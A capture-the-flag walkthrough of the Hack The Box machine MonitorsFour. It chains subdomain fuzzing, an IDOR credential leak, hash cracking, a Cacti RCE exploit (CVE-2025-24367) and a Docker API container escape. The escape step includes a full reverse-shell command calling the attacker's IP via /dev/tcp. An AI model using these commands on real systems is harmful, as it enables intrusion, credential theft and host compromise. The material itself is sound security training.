
<div align="center">
<img src="obsidian://open?vault=Pentesting&file=x-Published%20GIT%2FHTB%2FLabs%2Fattachments%2FPasted%20image%2020260522092700.png">
</div>
[Machine Page](https://app.hackthebox.com/machines/MonitorsFour?sort_by=created_at&sort_type=desc)  
**Difficulty:** Easy  
**OS:** Windows (running Docker Desktop with WSL2)  
**CVEs Exploited:** CVE-2025-24367  
**Topics:** Subdomain enumeration, IDOR, Cacti RCE, Docker API abuse, Container escape

By: [https://app.hackthebox.com/users/2727685](https://app.hackthebox.com/users/2727685)

---

## Overview

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#overview)

MonitorsFour is a Windows machine running Docker Desktop with WSL2. The attack chain involves discovering a hidden subdomain hosting a vulnerable Cacti instance, exploiting an IDOR vulnerability on the main site to leak credentials, using those credentials to exploit an authenticated RCE vulnerability in Cacti to land a shell inside a Docker container, and finally escaping to the host via an unauthenticated Docker API, achieving root-level access on the Windows host.

---

## Step 1 -- Reconnaissance

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-1----reconnaissance)

We start with an **nmap scan** to discover open ports:

```shell
nmap -sC -sV -p- 10.129.2.116
```

Key findings:

- **Port 80** — HTTP (nginx web server)
- **Port 5985** — WinRM (Windows Remote Management)

Visiting `http://monitorsfour.htb` in the browser shows a standard corporate landing page, nothing immediately exploitable.

![](https://github.com/Nuun56/Walkthroughs/raw/main/HTB/Labs/attachments/Pasted%20image%2020260522124851.png)

---

## Step 2 -- Subdomain Enumeration with ffuf

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-2----subdomain-enumeration-with-ffuf)

Note

**What is subdomain enumeration?**  
Large web applications often run multiple services under different subdomains (e.g. `admin.example.com`, `api.example.com`). These subdomains are sometimes forgotten or less secured than the main site. We fuzz for them by sending requests with different `Host` headers and looking for responses that differ from the default.

We use **ffuf** (Fuzz Faster U Fool) — a fast web fuzzer:

```shell
ffuf -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -t 100 \
     -timeout 3 \
     -ac
```

Flag breakdown:

- `-H "Host: FUZZ.monitorsfour.htb"`: replaces FUZZ with each word from the wordlist
- `-ac`: auto-calibrate: automatically detects and filters out the default "not found" response so we only see real hits
- `-t 100`: 100 threads for speed

Result:

```
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 98ms]
| URL | http://monitorsfour.htb
| --> | /cacti
    * FUZZ: cacti
```

We discovered `cacti.monitorsfour.htb`. Add it to `/etc/hosts`:

```shell
sudo bash -c 'echo "10.129.2.116 cacti.monitorsfour.htb" >> /etc/hosts'
```

![](https://github.com/Nuun56/Walkthroughs/raw/main/HTB/Labs/attachments/Pasted%20image%2020260522124910.png)

---

## Step 3 -- Credential Discovery via IDOR

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-3----credential-discovery-via-idor)

Since Cacti requires authentication, we go back to the main site and look for hidden API endpoints.

Note

**What is an IDOR?**  
IDOR stands for Insecure Direct Object Reference. It's a vulnerability where an application exposes internal objects (like database records) directly through user-controlled input — without properly checking if the requester is authorized to access them. A classic example is changing `?id=5` to `?id=1` and getting someone else's data.

We fuzz the main site for API endpoints:

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://monitorsfour.htb/FUZZ -ac
```

This reveals a `/user` endpoint that accepts a `token` parameter. When testing for IDOR, a common trick is to try edge case values like `0`, `1`, `2` — the value `0` often either errors out or, when developers forget to handle it, dumps all records.

```shell
curl -s "http://monitorsfour.htb/user?token=0"
```

The server returns a full list of users with their MD5 password hashes:

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "name": "Michael Watson"
  }
]
```

**Cracking the MD5 hashes:**

The admin hash `56b32eb43e6f15395f6c46c1c9e1cd36` was cracked instantly using CrackStation ([https://crackstation.net](https://crackstation.net)):

```
56b32eb43e6f15395f6c46c1c9e1cd36 → wonderful1
```

**Finding the right username:**  
Logging in as `admin:wonderful1` didn't work on Cacti. However, looking at the leaked user data — name `Marcus Higgins`, email `admin@monitorsfour.htb`, we tried plausible username variations: `marcus`, `mhiggins`, `higgins`. The correct combo turned out to be:

```
Username: marcus
Password: wonderful1
```

---

## Step 4 -- Exploiting CVE-2025-24367 (Cacti Authenticated RCE)

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-4----exploiting-cve-2025-24367-cacti-authenticated-rce)

**About CVE-2025-24367**  
This is an authenticated Remote Code Execution vulnerability in Cacti versions up to 1.2.28. It abuses the graph templates functionality to write a malicious PHP file into the web root, which can then be triggered to execute arbitrary commands, including a reverse shell.

We used the public PoC by TheCyberGeek:

```shell
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
```

Start listener:

```shell
nc -lvnp 4444
```

Run the exploit (requires sudo because it spins up an HTTP server on port 80 to deliver the payload):

```shell
sudo python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus \
  -p wonderful1 \
  -i 10.10.16.51 \
  -l 4444
```

We received a shell as `www-data` inside a Docker container.

---

## Step 5 -- Container Enumeration

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-5----container-enumeration)

**Stabilizing the shell:**

Normally the first thing you'd do after getting a reverse shell is upgrade it to a fully interactive TTY using Python:

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

However, this container had **no Python installed** — `python3`, `python`, and `python2` were all missing. We had to work with the raw shell as-is, which meant no tab completion, no arrow keys, and commands could accidentally kill the shell. Something to keep in mind.

**Confirming we're in a container:**

```shell
ip a
ip route
```

Output showed we were at `172.18.0.3` with gateway `172.18.0.1` -> a typical Docker network.

**Finding database credentials:**

```shell
cat /var/www/html/cacti/include/config.php
```

Output:

```html
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
```

**Dumping the Cacti user table:**

```shell
mysql -h 172.18.0.1 -u cactidbuser -p'7pyrf6ly8qx4' cacti \
  -e "select username,password from user_auth;"
```

Output:

```
admin   $2y$10$wqlo06C4isr4q9xhqI/UQOpyM/n8EDzYl/GndqhDh/2LQihzPdHWO
guest   43e9a4ab75570f5b
marcus  $2y$10$bPWlnZYLhoDUawu4x8vLAuCIaDbqIUe4s9t9HqFm/1gtbavD/eKGe
```

**Cracking the marcus bcrypt hash:**

```shell
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `marcus:wonderful1` Same password as before, confirming password reuse.

---

## Step 6 -- User Flag

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-6----user-flag)

While enumerating the container we noticed `/home/marcus` existed and was readable by `www-data`. The user flag was sitting right there:

```shell
cat /home/marcus/user.txt
```

No need to escape the container for the user flag. It was accessible directly from within our initial `www-data` shell.

**Note on WinRM:** Port 5985 (WinRM) was open on the host and we attempted to connect using the cracked credentials:

```shell
evil-winrm -i 10.129.2.116 -u marcus -p 'wonderful1'
```

This returned a `WinRMAuthorizationError` — the credentials did not work for WinRM. The user flag had already been captured from inside the container anyway, so we moved straight to the Docker escape for root.

---

## Step 7 -- Docker API Escape (Privilege Escalation to Root)

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#step-7----docker-api-escape-privilege-escalation-to-root)

Note

**What is the Docker API?**  
Docker exposes a REST API (usually on port 2375) for managing containers. If this API is unauthenticated and reachable, an attacker can create new containers, mount the host filesystem, and effectively escape the container entirely.

From `/etc/resolv.conf` inside the container we found the Docker host IP:

```
# ExtServers: [host(192.168.65.7)]
```

Testing the Docker API:

```shell
curl http://192.168.65.7:2375/version
```

It responded with full Docker version info, completely unauthenticated!

**Creating a malicious container that mounts the host filesystem:**

```shell
cat > /tmp/create_container.json << 'EOF'
{
  "Image": "ubuntu",
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.51/5555 0>&1"],
  "Binds": ["/:/host_root"],
  "Privileged": true
}
EOF
```

Key fields:

- `"Binds": ["/:/host_root"]`: mounts the entire host filesystem at `/host_root` inside the new container
- `"Privileged": true`: gives the container full host privileges
- `"Cmd"`: runs a reverse shell back to our machine on port 5555

Start a listener on the attack machine:

```shell
nc -lvnp 5555
```

Create the container via the Docker API:

```shell
curl -H 'Content-Type: application/json' \
  -d @/tmp/create_container.json \
  "http://192.168.65.7:2375/containers/create" \
  -o /tmp/response.json

cat /tmp/response.json
```

Extract the container ID and start it:

```shell
cid=$(cat /tmp/response.json | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
curl -X POST "http://192.168.65.7:2375/containers/$cid/start"
```

We received a root shell in the new container with the entire host filesystem mounted at `/host_root`.

**Reading the root flag:**

```shell
cat /host_root/Users/Administrator/Desktop/root.txt
```

---

## Summary

[](https://github.com/Nuun56/Walkthroughs/blob/main/HTB/Labs/MonitorsFour.md#summary)

|Step|Action|Tool/Technique|
|---|---|---|
|1|Port scan|nmap|
|2|Subdomain discovery|ffuf virtual host fuzzing|
|3|Credential leak|IDOR on /user?token=0 + MD5 cracking|
|4|RCE on Cacti|CVE-2025-24367|
|5|Container enumeration|Manual + MySQL|
|6|User flag|Readable from /home/marcus in container|
|7|Docker API escape|Unauthenticated Docker daemon|

---

![](https://github.com/Nuun56/Walkthroughs/raw/main/HTB/Labs/attachments/Pasted%20image%2020260523123912.png)